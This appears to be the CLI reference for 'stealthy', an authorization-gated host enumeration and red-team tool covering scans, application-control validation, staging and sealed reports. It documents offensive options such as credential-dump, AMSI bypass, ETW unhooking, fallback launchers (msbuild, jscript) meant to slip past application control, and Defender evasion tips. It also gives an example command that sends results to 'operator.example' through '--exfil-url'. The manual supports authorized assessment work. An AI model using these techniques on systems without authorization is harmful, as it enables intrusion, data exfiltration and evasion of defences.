# CLI Reference

The executable is named `stealthy`. Global options may appear before or after
the subcommand. Host-enumerating commands—including `list-plugins`, `enum`,
`controls`, and `live-controls`—require `--authorized` or
`STEALTHY_AUTHORIZED=1`.

## Global options

| Option | Meaning | Default |
| --- | --- | --- |
| `--authorized` | Alias for the full authorization acknowledgment | Off |
| `--i-understand-authorized-use-only` | Required authorization acknowledgment | Off |
| `-q`, `--quiet` | Suppress progress and human summaries | Off |
| `-v`, `--verbose` | Add diagnostic/finding progress; full sealed-report keys are never printed | Off |
| `--summary` | Print a concise host, finding, coverage, and next-action summary | Off |
| `--progress-json` | Emit `plugin_started`/`plugin_finished` JSON events to stderr for automation | Off |
| `--no-color` | Disable ANSI color output; `NO_COLOR` is also honored | Off |
| `--delay-ms N` | Randomized delay budget between plugins | `50` |
| `--format human|json|markdown|sarif` | Console/report format | `human` |
| `--min-severity LEVEL` | Display only findings at or above a level | `info` |
| `--fail-on LEVEL` | Exit `4` when the displayed maximum reaches the level | None |
| `--output memory|file|remote` | Result destination | `memory` |
| `--output-path PATH` | File destination for `--output file` | None |
| `--key-output-path PATH` | Protected key destination required for encrypted file/remote output; env: `STEALTHY_KEY_OUTPUT_PATH` | None |
| `--plaintext-file` | Write JSON instead of an encrypted file | Off |
| `--also-markdown` | Write `PATH.md` beside a file output | Off |
| `--exfil-url URL` | Absolute HTTPS destination for encrypted remote output | None |
| `--profile quiet\|balanced\|thorough\|ci` | Named OPSEC / engagement posture (explicit flags override) | `balanced` |
| `--plugin-timeout-ms N` | Per-plugin isolated-worker timeout; `0` = in-process | Profile default (`0` for quiet/balanced) |
| `--max-scan-seconds N` | Total scan duration limit; `0` disables | `1800` |
| `--max-findings N` | Maximum findings retained in one run | `10000` |
| `--max-report-bytes N` | Maximum serialized report size; `0` disables | `67108864` |
| `--checkpoint PATH` | Write/update a private plaintext JSON checkpoint during the run | None |
| `--ledger-dir PATH` | Artifact ledger directory | `.cache-run` |
| `--artifact PATH` | Read-only artifact hash/provenance/trust prediction; never executed | None |

`--progress-json` is deliberately written to stderr so stdout remains a stable
report stream. Events include the plugin ID, one-based position, total count,
and elapsed milliseconds when a plugin finishes.

Severity levels, from least to greatest, are `info`, `low`, `medium`, `high`,
and `critical`.

Profiles apply centralized noise budgets:

| Profile | External helpers | Walk entries | Helper records | Other behavior |
| --- | ---: | ---: | ---: | --- |
| `quiet` | No | 2,000 | 50 | 250 ms delay; slim control collection; in-process plugins |
| `balanced` | No | 10,000 | 200 | 50 ms delay; high-signal read-only checks; in-process plugins |
| `thorough` | Yes | 100,000 | 2,000 | No delay; verbose; isolated plugin workers (60s) |
| `ci` | No | 5,000 | 100 | Quiet JSON; isolated plugin workers (60s) |

Quiet and balanced do not spawn a `__plugin-worker` child per plugin. Pass
`--plugin-timeout-ms N` (N > 0) to restore isolated workers and a hard
timeout. `--max-scan-seconds` still cancels the run cooperatively when plugins
are in-process; it does not force worker isolation.

Explicit profile overrides work with both `--option value` and
`--option=value` forms.

`control_assessment` is collected during `enum` **only** when
`linux.app_control` or `windows.app_control` is in the selected plugin set.
Use `live-controls` for always-on inventory without running other plugins.
`controls` and `live-controls` support JSON, Markdown, and human output;
SARIF is unsupported for these reports. Their global output/file/fail-on
options do not persist or filter the control report.

For the complete JSON contract and reduced-coverage rules, see
[`docs/report-schema.md`](report-schema.md).

## `guide`

```text
stealthy guide
```

Prints the first-run safety and operator guide. No authorization or host
enumeration is required.

## `doctor`

```text
stealthy doctor
stealthy doctor --json
```

Checks supported OS, compiled plugin availability, working-directory safety, and
approved fallback availability. Human output ends with `READY`, `READY WITH
WARNINGS`, or `BLOCKED` plus ordered remediation steps. JSON output retains the
original boolean checks and adds `readiness`, `blocking`, `check_details`,
`fallback_tools`, and `recommendations` for automation.

## Beginner workflows

```text
stealthy quickstart
stealthy demo --html > demo.html
stealthy security-lab --root ./lab
stealthy presets
stealthy plugin-picker
stealthy explain-plugin linux.sudo
stealthy playbook linux.sudo
stealthy completions bash
```

These helpers explain authorization, use inert fixtures where applicable, and
do not enumerate a host unless `quickstart` is given `--authorized`.

## `disclaimer`

```text
stealthy disclaimer
```

Prints the legal and ethical use boundary without host enumeration.

## `list-plugins`

```text
stealthy --authorized list-plugins
stealthy --authorized list-plugins --tsv
```

Lists plugins compiled for the current build. `plugins` is a visible alias.
TSV output contains `id`, `name`, and `description` columns.

## `enum` / `scan`

```text
stealthy --authorized enum
stealthy --authorized scan
stealthy --authorized --profile quiet enum
stealthy --authorized scan --preset quick
stealthy --authorized scan --preset standard
stealthy --authorized scan --preset deep
stealthy --authorized enum --auto-exploit
stealthy --authorized enum --allow-techniques kernel-exploit,potato
stealthy --authorized enum --plugins ID1,ID2
stealthy --authorized enum --skip ID1,ID2
stealthy --authorized enum --triage --triage-out decisions.json
stealthy --authorized enum --approve-file decisions.json
stealthy --authorized --checkpoint /tmp/run.json enum
stealthy --authorized enum --plugins linux.app_control --artifact /approved/test/artifact
stealthy --authorized enum --plugins windows.app_control --artifact C:\\approved\\test\\artifact.exe
```

`scan` is a visible alias for `enum`. Options:

- `--save-baseline PATH`: save the completed plaintext JSON report.
- `--compare-with PATH`: compare the completed report with a prior baseline.

`--min-severity` filters rendered findings in human, Markdown, JSON, and SARIF
output. Coverage and reduced-capability warnings remain visible so filtering
cannot be mistaken for a clean result.

- `--auto-exploit`: enables supported reversible probes.
- `--allow-techniques`: comma-separated high-impact families when ROE permits.
  Known IDs: `persistence`, `host-crash`, `potato`, `kernel-exploit`,
  `service-replace`, `msi`, `credential-dump`, `endpoint-bypass`,
  `amsi-bypass`, `etw-unhook`, `av-edr-service`.
  Most non-evasion families record scaffold findings only in this revision.
  `endpoint-bypass` means alternate-path tracking + approved-fixture validation
  (pair with `--artifact` and/or `controls --execute`); it does not cover
  control interference.
  **Evasion techniques** (`amsi-bypass`, `etw-unhook`, `av-edr-service`) require
  `--confirm-evasion` (or `STEALTHY_EVASION_CONFIRMED=1`) in addition to
  `--authorized` and `--allow-techniques`. After gates pass, `amsi-bypass` /
  `etw-unhook` emit `FindingKind::ExploitAttempt` with
  `condition=technique-opted-in`. `av-edr-service` performs read-only product
  observation and emits `av-edr-product-observed` /
  `av-edr-collection-limited` plus `av-edr-playbook-ready` with a thorough
  operator What's-next (no service stop or sensor tamper). See
  `docs/techniques.md` and `docs/evasion.md`.
- `--plugins`: runs the listed IDs; unknown IDs fail.
- `--skip`: excludes the listed IDs; unknown IDs fail.
- `--triage` / `--triage-out` / `--approve-file`: stepwise operator approval for probes.
  Create the triage checkpoint first, then pass that same `--checkpoint` with
  `--approve-file`. Approval files are bound to the checkpoint `run_id`; a
  missing, mismatched, or unknown `finding_id` is rejected. Approved probe IDs
  are scoped to their owning finding/plugin; they do not enable probes globally.

Linux SUID/SGID/capability traversal is bounded, same-filesystem,
non-symlink-following, and cancellation-aware. It honors:

- `STEALTHY_SUID_ROOTS`: colon-separated roots;
- `STEALTHY_SUID_MAX_DEPTH`: maximum depth per root; and
- `STEALTHY_SUID_MAX_ENTRIES`: hard inspected-entry cap, further constrained
  by the active profile's walk budget.

The Linux sudo, SUID, and selected wildcard-cron checks can add structured
`gtfobins.*` recommend-only annotations from a local allowlist. Windows service
images, scheduled-task actions, and autoruns can similarly add allowlisted,
machine-readable `lolbas.*` metadata. Both catalogs set
`recommend_only=true`; no catalog technique is executed.

Windows native coverage distinguishes object security descriptors from
filesystem ACLs: services evaluate dangerous current-token service-object
rights and service paths; scheduled tasks evaluate task-definition and
action-file ACLs plus registry-backed Task Scheduler descriptors for
`WRITE_DAC`, `WRITE_OWNER`, and `DELETE`. Unavailable descriptors are
reported as unavailable rather than safe. DLL search/app-directory
ACL enumeration runs without `--auto-exploit`; only a reversible marker
confirmation requires an exact finding approval or explicit blanket
`--auto-exploit`.

The application-control plugins expose policy discovery, package/signer/hash/path
trust evidence, sensor/tamper state, audit sources, harmless validation cases,
and named detection-exposure expectations. `--artifact` only reads metadata and
hashes; it never runs, modifies, or attempts to authorize the supplied file.

## `controls` / `validate-controls`

```text
stealthy --authorized controls --format json
stealthy --authorized controls --case hash-drift
stealthy --authorized controls --case interpreter-script --execute
stealthy --authorized controls --signed-artifact C:\\approved\\signed.exe
stealthy --authorized controls --baseline prior-report.json --case policy-drift
stealthy --authorized controls --case user-path-exec --execute
stealthy --authorized controls --root C:\\temp\\stealthy-controls --keep-fixtures
```

The command creates disposable fixtures and records evidence for every
platform-appropriate case in the control matrix. It does not modify host
policy, trust databases, certificates, mounts, SUID bits, file capabilities, or
kernel state. On Windows it may set and read back ACLs on its own generated
administrator-controlled fixture directory; it never changes an existing host
directory. By default it does not execute fixtures. `--execute` starts only
generated benign probes, interpreter scripts, isolated MAC probes, or an
isolated mount-namespace probe, and records before/after audit-source evidence
and a measured per-case telemetry score. It never loads a supplied DLL/plugin
or installs an MSI.

Windows signer/scope cases require `--signed-artifact` from the organization’s
normal signing workflow; the tool does not create certificates or change a
certificate store. Linux package cases use package-manager verification tools
and fapolicyd trust checks when installed. `--artifact` can supply an approved
driver/module for signature and dry-run compatibility inspection; it is never
loaded. `--baseline` accepts a previous full JSON report or control assessment
and compares policy evidence, sensor prevention rules, audit-source
availability, management, and exposure drift.

Case IDs are platform-specific. Windows cases are `signed-vs-unsigned`,
`publisher-scope`, `hash-drift`, `file-class-scope`,
`managed-installer-boundary`, `dynamic-code`, `audit-vs-enforce`,
`driver-hvci`, `install-path-scope`, `policy-drift`, and `user-path-exec`.
Linux cases are `package-vs-copy`, `package-vs-custom-trust`,
`integrity-drift`, `interpreter-script`, `mac-domain`, `mount-flags`,
`suid-capability`, `container-host`, and `kernel-lockdown`.

## `live-controls` / `collect-controls`

```text
stealthy --authorized live-controls --format json
stealthy --authorized --artifact /approved/test/artifact live-controls
```

Collects live host state without creating fixtures or running validation
probes. It gathers effective policy exports and rule summaries, artifact
format/signer/.NET/MSI/plugin indicators, native ACL classification, recent
Windows/Linux audit data, managed-installer and EDR state, package and trust
metadata, IMA/fs-verity evidence, MAC profiles and denials, mount and
SUID/capability metadata, kernel driver/module state, namespace/container
identity, and a deterministic live telemetry score.

### Live capability tracking

The live collector tracks each capability explicitly:

| # | Capability | JSON evidence |
| ---: | --- | --- |
| 1 | AppLocker/WDAC policy parsing and publisher/product/version evaluation | `policies[].rules`, `artifact.policy_rule` |
| 2 | DLL/MSI/.NET/plugin static analysis | `artifact.static_analysis`, `artifact.kind` |
| 3 | ACL parsing and path classification | `artifact.access_control`, `artifact.path_class` |
| 4 | Windows/Linux event collection and correlation | `audit_sources[].recent_events`, `recent_denials`, `correlated_artifact_events`, `snapshot_sha256` |
| 5 | Managed-installer and provenance evidence | managed-installer policy rules, sensor prevention rules, artifact origin/signer fields |
| 6 | Driver/module signature and HVCI/lockdown metadata | driver/module evidence, HVCI policy evidence, lockdown state |
| 7 | RPM/DEB/package/fapolicyd trust | package policy, package trust evidence, fapolicyd rules/trust evidence |
| 8 | IMA/fs-verity integrity evidence | `artifact.integrity_status` and artifact evidence |
| 9 | SELinux/AppArmor profiles and denials | MAC policy notes and audit-source denial counts |
| 10 | Mount/SUID/file-capability classification | mount summary, `artifact.mount_options`, owner/mode, capability evidence |
| 11 | Host/container comparison inputs | namespace notes and `controls --baseline` drift output |
| 12 | EDR/provider inventory | `sensors[]`, prevention rules, management scope, and log availability |
| 13 | Deterministic telemetry scoring | `live_telemetry_score`, `live_telemetry_label`, and per-case telemetry fields |

This matrix is the implementation checklist for the live collection path; the
fixture `controls` command is separate and is used only for disposable
validation probes.

## `resume`

```text
stealthy --authorized resume --checkpoint /tmp/run.json
```

Continues a prior checkpointed run, skipping plugins already marked `ok`.

## `ingest`

```text
stealthy ingest script-report.json --format json
```

Normalizes script-fallback JSON into schema v2 (stable IDs, MITRE, attack paths).

## `artifacts` / `cleanup`

```text
stealthy artifacts --latest
stealthy cleanup --latest --secure-delete
```

List or remove removable paths recorded in the run ledger. Memory-only runs do
not create a ledger. Ledgers are private, integrity-tagged files and tampered
or malformed ledgers are rejected. `cleanup --secure-delete` is best-effort overwrite then
unlink for files; staged directories are removed recursively only when the
stage output was created empty by `stage`. `--remove-self` also attempts to
remove the current executable and should be used only as a separately approved
closeout action.

## `stage` / `verify` / `one-liners`

```text
stealthy stage --os linux --arch x86_64 --target-hostname target-a --out ./drop --binary ./target/release/stealthy
stealthy verify --path ./drop/cache-update --expect-sha256 HEX
stealthy one-liners --os linux --transport ssh
stealthy one-liners --os windows --transport winrm
```

Operator-workstation delivery helpers (no host enumeration; no auth gate).
The operator catalog for getting a staged bundle onto a host is
[Get the kit onto a host](runbook/delivery.md).
`stage` also emits `scripts/run.sh` or `scripts/run.ps1` and a
`stealthy-run.conf` dispatcher manifest describing the approved fallback path.
When `--binary` is omitted, `stage` creates an explicit `bundle_mode=script-only`
bundle: no file is written under the primary binary name, `primary_binary` is
empty, and `SHA256SUMS` states that there is no primary binary. With `--binary`,
the manifest records `bundle_mode=native-with-fallbacks` and the checksum file
contains the primary binary digest.
The manifest is not authorization evidence: the dispatcher requires a fresh
`--authorized` flag or `STEALTHY_AUTHORIZED=1` at execution time. It binds to
the current host, tries the primary executable, and walks only the
manifest-approved fallback list after a launch failure (Windows default:
`powershell,jscript,msbuild`; Linux default: `python,bash,sh,perl`).
Windows bundles also declare the `windows-evasion` feature. It is not part of
dispatcher fallback selection; the evasion module runs only when an operator
opts into an evasion family and all three gates pass (`status=ready`).

On Windows, prefer staging outside `%TEMP%` — Defender often quarantines freshly
copied unsigned PEs there. Org Authenticode signing (external to this tool)
reduces SmartScreen/reputation friction; stage the signed binary with
`--binary`. If the PE is missing or blocked (including signal death / vanished
after launch), `run.ps1` walks `powershell → jscript → msbuild` and continues
when a tier is itself blocked. Linux `run.sh` walks `python → bash → sh → perl`
the same way. Script tiers are reduced coverage: only auth and `--json` /
`-Json` are forwarded; binary flags such as `--profile` / `--plugins` are not
applied. The dispatcher does not itself approve AppLocker, WDAC, SmartScreen,
AppArmor, SELinux, or `noexec`; if the selected interpreter is not already
allowed, that tier is skipped and the next approved host is tried.

`one-liners` transports: Linux `ssh` / `scp` / `http` / `smb`; Windows `ssh` /
`scp` / `winrm` / `smb` / `http`. Snippets are placeholders — stage a bundle
first, then replace host and drop path from the engagement worksheet.

## `report`

```text
stealthy report REPORT.seal --key-file /approved/keys/report.key
stealthy report REPORT.seal --key-file /approved/keys/report.key --format json
stealthy report REPORT.seal --key-file /approved/keys/report.key --format markdown
stealthy report REPORT.seal --key-file /approved/keys/report.key --format sarif
```

Decrypts a sealed report locally. It does not enumerate the host and does not
require authorization. `--key-file PATH` is preferred and can be supplied by
`STEALTHY_KEY_FILE`. `STEALTHY_KEY_HEX` supplies a protected environment
value when a file is impractical. `--key-hex VALUE` remains for compatibility
but is discouraged because process arguments may be captured by shell history
or process inspection. Key sources conflict; provide exactly one. The key is
never inferred or recovered by the tool.

## `diff`

```text
stealthy diff BASELINE.json CURRENT.json
stealthy diff BASELINE.json CURRENT.json --format markdown
```

Compares plaintext JSON reports offline. It reports added, removed, and
changed findings. Duplicate finding identities are rejected rather than silently
overwritten. SARIF is intentionally unsupported for diffs.

Offline report helpers include `html-report`, `explain-finding`,
`coverage-compare`, and `disposition`; use `playbook ID` for safe verification,
rollback, and post-fix recheck guidance.

## Output modes

### Memory

Default. Findings remain in the encrypted in-memory store and are rendered to
the selected console format. No report file is created.

### File

```text
stealthy --authorized --output file --output-path findings.seal --key-output-path /approved/keys/findings.key enum
stealthy --authorized --output file --plaintext-file --output-path findings.json enum
```

File mode requires `--output-path`. Encrypted file mode also requires a
distinct `--key-output-path` or `STEALTHY_KEY_OUTPUT_PATH`. The full key is
never printed to stderr. Unix output/key files use mode `0600`; Windows removes
inheritance and grants full control only to the current SID. Plaintext output
must be approved by the evidence policy.

### Remote

```text
stealthy --authorized --output remote --exfil-url https://operator.example/ingest --key-output-path /approved/keys/remote.key enum
```

Remote mode requires `curl` and an absolute HTTPS URL. It POSTs the encrypted
body from standard input, accepts only a 2xx response, and treats client,
connection, timeout, and HTTP failures as command failures. It writes the key
only to the protected key path and never includes the body in process arguments.

## Exit codes

| Code | Meaning |
| ---: | --- |
| `0` | Success; no selected failure threshold was crossed |
| `2` | Authorization acknowledgment missing |
| `3` | `doctor` readiness check failed |
| `4` | `--fail-on` threshold triggered |
| Other nonzero | Invalid arguments, unavailable input, or operational failure |
